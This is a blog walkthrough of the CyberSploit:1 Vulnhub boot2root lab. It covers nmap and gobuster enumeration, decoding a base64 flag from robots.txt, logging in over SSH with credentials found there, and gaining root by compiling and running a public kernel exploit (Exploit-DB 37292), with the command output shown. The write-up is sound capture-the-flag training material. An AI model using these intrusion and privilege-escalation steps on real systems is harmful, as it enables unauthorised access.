---
date: 2020-07-27 00:01:45
layout: post
title: "CyberSploit 1 Vulnhub Walkthrough"
subtitle:
description: CyberSploit:1 is a boot2root VM from Vulnhub. This is the first part of the Vulnhub's CyberSploit Series.
image: /assets/img/uploads/cybersploit-1/cyber-robot.png
optimized_image: /assets/img/uploads/cybersploit-1/cyber-robot-optimized.png
category: walkthrough
tags: vulnhub boot2root
author: madhavmehndiratta
paginate: false
keywords: cybersploit 1, cybersploit 1 vulnhub, cybersploit 1 walkthrough, cybersploit 1 vulnhub walkthrough, cybersploit 1 writeup, vulnhub cybersploit walkthrough, cybersploit writeup, infosec articles
---

Today I will be sharing a walkthrough of CyberSploit:1, a boot2root VM available on Vulnhub. This is the first part of the Vulnhub's CyberSploit Series and rated easy. It consists of three flags and our goal is to read all the three flags. I have added the IP address of the machine to the hosts file, So Let's Begin!

```r
root@kali:~# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
192.168.1.7     cybersploit
```

## Enumeration 

I started the reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.

```r
root@kali:~# nmap -sC -sV -oA nmap/initial cybersploit

Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for cybersploit (192.168.1.7)
Host is up (0.00027s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d (DSA)
|   2048 d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de (RSA)
|_  256 ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hello Pentester!
MAC Address: 08:00:27:FF:BD:6F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds
```
We see a ssh port open and a port 80 open which is running an Apache 2.2.22 web server. Looking at port 80 on the web browser, we see a GIF. Looking at the page source, I found a username <b>itsskv.</b> This might be useful in future! 

<center><br><br>
<img src="/assets/img/uploads/cybersploit-1/username.png">
</center>

This web application is not much functional, so next I decided to run a gobuster scan to look for hidden pages.

```r
root@kali:~# gobuster dir -u http://cybersploit -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html 

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://cybersploit
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
Starting gobuster
===============================================================
/index (Status: 200)
/index.html (Status: 200)
/robots (Status: 200)
/robots.txt (Status: 200)
/hacker (Status: 200)
/server-status (Status: 403)
===============================================================
Finished
===============================================================
```

The hacker page is simply the GIF we see in the home page but robots or robots.txt has some interesting information.

<center><br>
<img src="/assets/img/uploads/cybersploit-1/robots.png">
</center>

It contains some string which is most probably base64, after decoding it, we can read our first flag! That was easy!

```r
root@kali:~# echo -n R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9 | base64 -d

Good Work !
Flag1: cybersploit{youtube.com/c/cybersploit}
```

We can now login into the target machine via ssh using username <b>itsskv</b> and password:<br><b>cybersploit{youtube.com/c/cybersploit}.</b>

```r
root@kali:~# ssh itsskv@cybersploit

Warning: Permanently added the ECDSA host key for IP address '192.168.1.7' to the list of known hosts.

itsskv@cybersploits password:
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

332 packages can be updated.
273 updates are security updates.

New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Your Hardware Enablement Stack (HWE) is supported until April 2017.

Last login: Sat Jun 27 10:14:39 2020 from cybersploit.local
itsskv@cybersploit-CTF:~$
```

After logging in as user itsskv, I found a <b>flag2.txt</b> in the same directory, but this flag is encoded into binary. 

```r
itsskv@cybersploit-CTF:~$ cat flag2.txt 
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101
```

We can easily decode it using <a href="https://gchq.github.io/CyberChef/" rel=”nofollow”>Cyber Chef</a> and read our second flag!

<center><br>
<img src="/assets/img/uploads/cybersploit-1/cyberchef.png">
</center>

## Privilege Escalation

The root is quite simple. Looking at the output of <b>uname -a</b> command, I found that this machine is using an old version of kernel which is vulnerable to many exploits. 

```r
itsskv@cybersploit-CTF:~$ uname -a
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
```

I decided to go with <a href="https://www.exploit-db.com/exploits/37292" rel=”nofollow”>this</a> exploit. Just download and compile this exploit in the target machine and execute the binary.

```r
itsskv@cybersploit-CTF:~$ gcc 37292.c -o exploit
itsskv@cybersploit-CTF:~$ ./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
# python -c 'import pty;pty.spawn("/bin/bash")'
root@cybersploit-CTF:/home/itsskv#
```
Yeaah! We are root! Now we can read our final flag present in the root directory.

```r
root@cybersploit-CTF:/home/itsskv# cat /root/finalflag.txt 
  ______ ____    ____ .______    _______ .______          _______..______    __        ______    __  .___________.
 /      |\   \  /   / |   _  \  |   ____||   _  \        /       ||   _  \  |  |      /  __  \  |  | |           |
|  ,----' \   \/   /  |  |_)  | |  |__   |  |_)  |      |   (----`|  |_)  | |  |     |  |  |  | |  | `---|  |----`
|  |       \_    _/   |   _  <  |   __|  |      /        \   \    |   ___/  |  |     |  |  |  | |  |     |  |     
|  `----.    |  |     |  |_)  | |  |____ |  |\  \----.----)   |   |  |      |  `----.|  `--'  | |  |     |  |     
 \______|    |__|     |______/  |_______|| _| `._____|_______/    | _|      |_______| \______/  |__|     |__|     
                                                                                                                  

   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 

flag3: cybersploit{Z3X21CW42C4 many many congratulations !}

if you like it share with me https://twitter.com/cybersploit1.

Thanks !
```

That’s it! Thanks for reading. Stay tuned for similar walkthroughs and much more coming up in the near future!
If you have any queries, you can contact me <a href="/contact">here.</a>

NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/benbely" rel=”nofollow”>Mia Ditmanson.</a>